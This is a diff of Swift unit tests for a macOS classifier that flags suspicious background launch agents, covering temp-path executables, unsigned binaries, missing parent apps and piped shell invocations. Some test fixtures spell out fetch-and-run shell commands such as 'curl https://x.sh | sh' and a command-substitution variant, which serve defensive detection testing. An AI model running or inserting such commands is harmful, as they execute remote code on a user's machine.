@@ -226,38 +226,36 @@ struct SafetyClassifierSuspiciousTests {
         #expect(!classifier.classify(input).reasons.contains(.shellInvocation))
     }
 
-    @Test("Uppercase temp paths are caught on the case-insensitive filesystem")
-    func uppercaseTempPathIsFlagged() {
-        let input = BackgroundItemClassifierInput(
-            label: "com.example.shout",
-            source: .userLaunchAgent,
-            plistPath: "/tmp/com.example.shout.plist",
-            executablePath: "/TMP/evil",
+    @Test("Filename mismatch is scoped to user agents — /Library vendor quirks don't flag")
+    func mismatchScopedToUserAgents() {
+        let systemInput = BackgroundItemClassifierInput(
+            label: "com.vendor.updater.daemon",
+            source: .systemLaunchAgent,
+            plistPath: "/Library/LaunchAgents/com.vendor.updater.plist",
+            executablePath: "/Library/Vendor/updater",
             identity: nil,
             executableExists: true,
             plist: nil
         )
-        let result = classifier.classify(input)
-        #expect(result.safety == .review)
-        #expect(result.reasons.contains(.suspiciousExecutablePath))
+        #expect(!classifier.classify(systemInput).reasons.contains(.labelFilenameMismatch))
     }
 
-    @Test("Suspicious early return still carries the unsigned evidence chip")
-    func suspiciousCarriesUnsignedChip() {
-        let identity = BinaryIdentity(binaryPath: "/tmp/tool", vendor: .unsigned)
+    @Test("Suspicious early return carries the parentAppMissing evidence chip")
+    func suspiciousCarriesParentAppMissingChip() {
         let input = BackgroundItemClassifierInput(
-            label: "com.example.tool",
+            label: "com.example.gone",
             source: .userLaunchAgent,
-            plistPath: "/tmp/com.example.tool.plist",
-            executablePath: "/tmp/tool",
-            identity: identity,
+            plistPath: "/tmp/com.example.gone.plist",
+            executablePath: "/tmp/gone-tool",
+            identity: nil,
             executableExists: true,
+            parentAppInstalled: false,
             plist: nil
         )
         let result = classifier.classify(input)
         #expect(result.safety == .review)
         #expect(result.reasons.contains(.suspiciousExecutablePath))
-        #expect(result.reasons.contains(.unsigned))
+        #expect(result.reasons.contains(.parentAppMissing))
     }
 
     // MARK: - Interaction with earlier rules
@@ -322,5 +320,71 @@ struct SafetyClassifierSuspiciousTests {
             vendorDisplayName: vendor == .thirdPartyKnown ? "Stub Vendor" : nil,
             sensitiveCategories: sensitiveCategories
         )
+    }
+}
+
+// Pure static-helper coverage for the suspicion signals, split out to keep
+// each type body under the 300-line SwiftLint limit.
+@Suite("Suspicious signal helpers")
+struct SuspiciousSignalHelperTests {
+
+    @Test("Uppercase temp paths are caught on the case-insensitive filesystem")
+    func uppercaseTempPathIsFlagged() {
+        let input = BackgroundItemClassifierInput(
+            label: "com.example.shout",
+            source: .userLaunchAgent,
+            plistPath: "/tmp/com.example.shout.plist",
+            executablePath: "/TMP/evil",
+            identity: nil,
+            executableExists: true,
+            plist: nil
+        )
+        let result = classifier.classify(input)
+        #expect(result.safety == .review)
+        #expect(result.reasons.contains(.suspiciousExecutablePath))
+    }
+
+    @Test("Suspicious early return still carries the unsigned evidence chip")
+    func suspiciousCarriesUnsignedChip() {
+        let identity = BinaryIdentity(binaryPath: "/tmp/tool", vendor: .unsigned)
+        let input = BackgroundItemClassifierInput(
+            label: "com.example.tool",
+            source: .userLaunchAgent,
+            plistPath: "/tmp/com.example.tool.plist",
+            executablePath: "/tmp/tool",
+            identity: identity,
+            executableExists: true,
+            plist: nil
+        )
+        let result = classifier.classify(input)
+        #expect(result.safety == .review)
+        #expect(result.reasons.contains(.suspiciousExecutablePath))
+        #expect(result.reasons.contains(.unsigned))
+    }
+
+    private let classifier = BackgroundItemSafetyClassifier()
+
+    @Test("env-wrapped shell invocations are unwrapped and flagged")
+    func envWrappedShellIsFlagged() {
+        let args = ["/usr/bin/env", "-i", "PATH=/usr/bin", "bash", "-c", "curl https://x.sh | sh"]
+        #expect(BackgroundItemSafetyClassifier.isPipedShellInvocation(args))
+    }
+
+    @Test("A -c after the script path belongs to the script, not the shell")
+    func dashCAfterScriptIsNotFlagged() {
+        let args = ["/bin/bash", "task.sh", "-c", "curl https://x.sh | sh"]
+        #expect(!BackgroundItemSafetyClassifier.isPipedShellInvocation(args))
+    }
+
+    @Test("Command substitution still yields a curl token")
+    func commandSubstitutionIsFlagged() {
+        let args = ["/bin/sh", "-c", "OUT=$(curl https://x.sh); run $OUT"]
+        #expect(BackgroundItemSafetyClassifier.isPipedShellInvocation(args))
+    }
+
+    @Test("Dot-segment paths are standardized before the temp-root checks")
+    func dotSegmentPathsAreNormalized() {
+        #expect(BackgroundItemSafetyClassifier.isSuspiciousExecutableLocation("/private/var/../tmp/evil"))
+        #expect(!BackgroundItemSafetyClassifier.isSuspiciousExecutableLocation("/tmp/../Applications/Tool.app/x"))
     }
 }
